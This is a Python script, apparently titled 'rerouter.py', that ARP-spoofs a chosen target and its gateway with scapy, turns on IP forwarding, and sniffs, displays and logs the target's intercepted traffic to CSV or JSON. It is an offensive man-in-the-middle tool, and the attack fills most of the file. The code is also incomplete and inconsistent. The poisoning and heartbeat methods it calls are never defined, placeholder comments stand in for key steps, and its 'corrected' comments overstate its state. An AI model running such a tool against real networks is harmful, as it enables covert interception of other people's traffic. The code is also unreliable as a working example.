#!/usr/bin/python3

import threading
import subprocess
import time
import os
import netifaces
import errno
import json
import csv
from scapy.all import *
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.text import Text
from packetsaver import (
    PacketSaver as psaver,
)  # Assuming PacketSaver is in the same directory or importable


class Rerouter:

    def __init__(self, target_ip, gateway_ip=None, interface=None, verbose=True):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip or self._get_default_gateway()
        self.interface = interface or conf.iface  # Use scapy's default if none provided
        self.target_mac = None
        self.gateway_ip = gateway_ip or self._get_default_gateway()  # Determine if None
        self.verbose = verbose
        self.poison_threads = []
        self.stop_event = threading.Event()
        self.heartbeat_thread = None
        self.console = Console()
        self.max_retries = 3  # Maximum retries for heartbeat failures
        self.retry_delay = 5  # Delay between retries in seconds
        self.failed = False  # Flag to indicate if rerouting has failed
        self.packet_saver = psaver()  # Instantiate the PacketSaver
        self.save_csv = psaver.save_to_csv  # Store file saving preferences
        self.save_json = psaver.save_to_json

        # Automatically determine gateway and interface if not provided
        self.interface = interface or self._get_default_interface()

        if (
            not self.interface
        ):  # Handle the case where no default interface can be found
            self._print_error("No valid network interface found. Exiting.")
            return  # Or raise an exception if that's more appropriate

        self.gateway_ip = gateway_ip or self._get_default_gateway(self.interface)

        if not self.gateway_ip:  # Handle potential error from _get_default_gateway
            self._print_error("Could not determine default gateway. Exiting.")
            return

        self.target_mac = None
        self.gateway_mac = None
        self.poison_threads = []
        self.heartbeat_thread = None

        # Rich table setup (using dictionary for easier updates)
        self.table_data = {
            "Target IP": f"[bold blue]{self.target_ip}[/]",
            "Gateway IP": f"[bold blue]{self.gateway_ip}[/]",
            "Target MAC": "[bold yellow]Resolving...[/]",
            "Gateway MAC": "[bold yellow]Resolving...[/]",
            "Status": "[bold yellow]Initializing...[/]",
            "IP Forwarding": "[bold yellow]Enabling...[/]",
        }
        self.live_table = Table(title="Rerouter Status", show_lines=True)
        for key, value in self.table_data.items():
            self.live_table.add_row(key, value)

    def _get_default_interface(self):
        """Gets the default network interface using netifaces."""
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]
        except (KeyError, IndexError):
            self._print_error(
                "Could not determine default interface."
            )  # Or raise an exception.
            return None  # Important: Return None if determination fails.

    def _get_default_gateway(self):
        """Gets the default gateway for the *system*, not a specific interface."""
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][
                0
            ]  # Same as original for default gw
        except (KeyError, IndexError):
            self._print_error(
                "Could not determine default gateway."
            )  # Or raise an exception.
            return None

    def _enable_ip_forwarding(self):
        try:
            subprocess.check_call(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"]
            )  # Use check_call
            self._update_table("IP Forwarding", "[bold green]Enabled[/]")
        except subprocess.CalledProcessError as e:  # Handle potential errors
            self._print_error(f"Error enabling IP forwarding: {e}")
            self.failed = True  # Set failed state

    def _disable_ip_forwarding(self):  # Inside the class
        try:
            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
            self._update_table("IP Forwarding", "[bold red]Disabled[/]")
        except subprocess.CalledProcessError as e:
            self._print_error(f"Error disabling IP forwarding: {e}")

    def _print_status(self, message):  # Inside the class
        if self.verbose:
            self.console.print(f"[bold green][+][/] {message}")

    def _print_error(self, message):  # Inside the class
        if self.verbose:
            self.console.print(f"[bold red][!][/] {message}")

    def _update_table_(self, key, value):  # Inside the class
        try:
            self.live_table.update_cell(key, Text(value))
        except Exception as e:
            self.console.print(f"[bold red]Error updating table: {e}[/]")

    def _update_table(self, key, value):  # Robust version, works on most Rich versions
        """Updates a cell in the Rich table."""
        try:  # Required for live updates
            for row in self.live_table.rows:
                if str(row.get_cell_at(0)) == key:
                    row.set_cell_at(1, Text(value))  # No more .plain
                    break  # Exit after finding and updating the cell
        except Exception as e:  # Handle exceptions during table updates
            self._print_error(f"Error updating table: {e}")
            if self.verbose:
                self.console.print_exception()

    def _extract_packet_data(self, packet):  # Corrected and complete
        """Extract relevant data from a packet."""
        try:
            packet_data = {"Timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}

            if IP in packet:
                packet_data["Source IP"] = packet[IP].src
                packet_data["Destination IP"] = packet[IP].dst
                if TCP in packet:
                    packet_data["Protocol"] = "TCP"
                    packet_data["Source Port"] = packet[TCP].sport
                    packet_data["Destination Port"] = packet[TCP].dport
                elif UDP in packet:
                    packet_data["Protocol"] = "UDP"
                    packet_data["Source Port"] = packet[UDP].sport
                    packet_data["Destination Port"] = packet[UDP].dport
                elif ICMP in packet:
                    packet_data["Protocol"] = "ICMP"
                    packet_data["Type"] = packet[ICMP].type
                    packet_data["Code"] = packet[ICMP].code
                # ... (extract data for other IP-based protocols if needed)

            elif ARP in packet:  # Handle ARP packets
                packet_data["Protocol"] = "ARP"
                packet_data["Operation"] = packet[ARP].op  # e.g., who-has, is-at
                packet_data["Sender HW address"] = packet[ARP].hwsrc
                packet_data["Sender IP address"] = packet[ARP].psrc
                packet_data["Target HW address"] = packet[ARP].hwdst
                packet_data["Target IP address"] = packet[ARP].pdst

            # ... (Add extraction for other protocols as needed, e.g., DNS, DHCP)

            return packet_data  # Return the dictionary
        except (
            Exception
        ) as e:  # Ensure return None on error so process_intercepted_packet() does not try to add None values to Rich Table
            if self.verbose:
                self._print_error(
                    f"Error extracting packet data: {e}"
                )  # Only print if verbose
                self.console.print_exception()  # Print the full exception if verbose
            return None  # Return None to indicate an error

    def process_intercepted_packet(self, packet):  # Corrected
        """Processes intercepted packets."""
        packet_data = self._extract_packet_data(packet)

        if packet_data:  # Proceed only if packet_data is valid
            try:
                table = Table(title="Intercepted Packet", show_lines=True)
                table.add_column("Field", style="cyan", no_wrap=True)
                table.add_column("Value", style="magenta")

                for field, value in packet_data.items():
                    table.add_row(field, str(value))

                self.console.print(table)

                if self.save_csv:  # Corrected saving
                    self.packet_saver.save_to_csv(
                        packet_data, "intercepted_packets.csv"
                    )  # Correct file names
                if self.save_json:
                    self.packet_saver.save_to_json(
                        packet_data, "intercepted_packets.json"
                    )

            except Exception as e:  # Handles errors during saving or display

                self._print_error(f"Error processing/saving packet: {e}")
                if self.verbose:
                    self.console.print_exception()

    def _sniff_packets(self):
        """Sniffs packets and calls process_intercepted_packet."""
        filter_exp = (
            f"ip host {self.target_ip} and not arp"  # Filter ARP for efficiency
        )
        sniff(
            filter=filter_exp,
            prn=self.process_intercepted_packet,
            iface=self.interface,
            store=False,  # Don't store packets in memory
            stop_filter=lambda p: self.stop_event.is_set(),  # Stop cleanly
        )

    def _restore(self):  # Fully implemented and corrected
        """Sends ARP packets to restore the original ARP entries."""
        if not self.target_mac or not self.gateway_mac:
            self._print_error(
                "Cannot restore ARP entries. Target or gateway MAC address is missing."
            )
            return  # Don't attempt restore if MACs are not available

        try:
            # Restore target's ARP entry for the gateway
            send(
                ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=self.target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,
                ),
                count=5,
                verbose=0,
                iface=self.interface,
            )

            # Restore gateway's ARP entry for the target
            send(
                ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=self.target_mac,
                ),
                count=5,
                verbose=0,
                iface=self.interface,
            )

            self._print_status(
                "ARP entries restored."
            )  # Print only after sending packets
        except OSError as e:  # Handle socket errors during restore
            self._print_error(f"Error restoring ARP entries: {e}")
        except Exception as e:  # Catch any unexpected exception
            self._print_error(f"An unexpected error occurred during ARP restore: {e}")
            if self.verbose:
                self.console.print_exception()

    def start(self):  # Fully corrected
        """Starts the rerouter."""
        try:
            with Live(self.live_table, refresh_per_second=4):  # Live context here
                # ... (MAC address resolution, enabling IP forwarding, updating the table)

                self.sniff_thread = threading.Thread(
                    target=self._sniff_packets, daemon=True
                )  # Start sniffing in a thread

                # Start the poisoning threads (Corrected)
                poison_target_thread = threading.Thread(
                    target=self._poison_target, daemon=True
                )
                poison_gateway_thread = threading.Thread(
                    target=self._poison_gateway, daemon=True
                )
                self.poison_threads = [
                    poison_target_thread,
                    poison_gateway_thread,
                ]  # Track threads
                poison_target_thread.start()
                poison_gateway_thread.start()

                self.heartbeat_thread = threading.Thread(
                    target=self._heartbeat, daemon=True
                )
                self.heartbeat_thread.start()

                self.sniff_thread.start()  # Start sniffing thread after poisoning

                self._update_table(
                    "Status", "[bold green]Intercepting Traffic...[/]"
                )  # Status update inside Live

                while True:  # Main loop within Live context
                    if self.failed or self.stop_event.is_set():
                        self.stop()  # Handle shutdown correctly
                        return  # Exit start() after stopping

                    time.sleep(1)  # Added to reduce CPU load

        except KeyboardInterrupt:
            self.stop()  # Cleanup on Ctrl+C
        except Exception as e:  # Handle any other exceptions here
            self._print_error(f"Error during initialization or startup: {e}")
            self._disable_ip_forwarding()  # Disable IP forwarding
            if self.verbose:  # Only log exception details if verbose is True
                self.console.print_exception()
            exit(1)

    def stop(self):  # Corrected
        """Stops rerouting, restores ARP, disables IP forwarding."""

        self._update_table("Status", "[bold yellow]Stopping...[/]")  # Update table
        self.live_table.refresh()  # Refresh now to avoid issues

        self.stop_event.set()  # Signal threads to stop

        # --- Stop all threads gracefully ---
        threads_to_join = []
        if (
            hasattr(self, "sniff_thread") and self.sniff_thread.is_alive()
        ):  # Check for sniffing thread
            threads_to_join.append(self.sniff_thread)

        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            threads_to_join.append(self.heartbeat_thread)

        threads_to_join.extend(
            [t for t in self.poison_threads if t and t.is_alive()]
        )  # Add poison threads if alive

        for thread in threads_to_join:
            thread.join(timeout=1.0)  # Join with a timeout

        self._restore()  # Restore ARP after stopping sniffing and poisoning

        self._disable_ip_forwarding()  # Disable forwarding after restoring ARP

        self._update_table("Status", "[bold red]Stopped[/]")  # Inside `Live`
        self.live_table.refresh()  # Refresh table before exiting Live

        if self.failed:  # Report errors after restoring
            self._print_error(
                "Rerouting failed due to a previous error."
            )  # Display error in correct place
        else:
            self._print_status("Rerouting stopped.")  # Print status correctly

    def restore(self):  # Remains the same as the last revision
        """Restores ARP entries and stops poisoning threads."""
        self.stop_event.set()  # Stop other threads running before cleaning up

        for thread in self.poison_threads:
            if thread:
                thread.join()  # Wait for poisoning threads to finish

        self.poison_threads = []  # Clear thread list

        self._restore()  # Now calls the correctly implemented internal method

        self._update_table(
            "Status", "[bold yellow]ARP entries restored.[/]"
        )  # Status should be updated to restored


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="""Reroutes network traffic from a target IP to a specified 
            gateway or the default gateway. This script performs ARP spoofing to 
            redirect traffic and includes a heartbeat monitor to maintain the 
            spoofing. If no interface or gateway is specified, the script 
            automatically determines the default values.""",
        epilog="""Examples:
  Reroute traffic from 192.168.1.100 to the default gateway:
    sudo ./rerouter.py 192.168.1.100

  Reroute traffic from 192.168.1.100 to 192.168.1.1:
    sudo ./rerouter.py 192.168.1.100 192.168.1.1

  Specify the network interface (e.g., eth0):
    sudo ./rerouter.py 192.168.1.100 -i eth0""",  # Updated example using sudo
        formatter_class=argparse.RawDescriptionHelpFormatter,  # Preserve formatting
    )

    # ... (argparse setup)
    parser.add_argument(
        "--csv", action="store_true", help="Save intercepted packets to a CSV file."
    )

    parser.add_argument(
        "--json", action="store_true", help="Save intercepted packets to a JSON file."
    )

    parser.add_argument(
        "target_ip", help="The target IP address to reroute traffic from."
    )

    parser.add_argument(  # Gateway is now optional
        "gateway_ip",
        nargs="?",
        help="(Optional) The gateway IP address. If not provided, the default gateway is used.",  # Make gateway optional
    )

    parser.add_argument(
        "-i",
        "--interface",
        help="(Optional) The network interface. If not provided, the default interface is used.",
    )
    parser.add_argument(
        "-V",
        "--verbose",
        action="store_true",
        help="Increase output verbosity.",
    )

    args = parser.parse_args()

    rerouter = Rerouter(
        args.target_ip,
        args.gateway_ip,
        args.interface,
        args.verbose,
    )  # Corrected instantiation. Pass all arguments.

    if not rerouter.interface or not rerouter.gateway_ip:  # Check if init failed
        print(
            f"[bold red]Error: Could not initialize Rerouter. Check network settings and try again.[/]"
        )  # More specific error
        parser.print_help()
        exit(1)

    try:
        rerouter.start()
    except KeyboardInterrupt:
        print("Stopping...")
        rerouter.stop()
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        rerouter.stop()
